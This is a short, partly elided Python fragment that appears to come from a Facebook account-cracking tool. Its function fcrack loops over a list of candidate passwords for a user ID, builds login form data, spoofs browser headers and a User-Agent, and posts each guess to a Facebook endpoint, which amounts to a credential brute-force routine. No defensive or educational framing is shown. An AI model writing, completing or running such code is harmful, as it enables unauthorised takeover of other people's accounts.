...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			...
			"pass":ps,
			"login":"Log In"}
			header_freefb ={'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'method': 'GET', 
            'path': '/',
            'scheme': 'https', 
            ...
            'User-Agent': pro,}
			lo = session.post("https://graph.facebook.com/me",data=log_data,headers=header_freefb).text
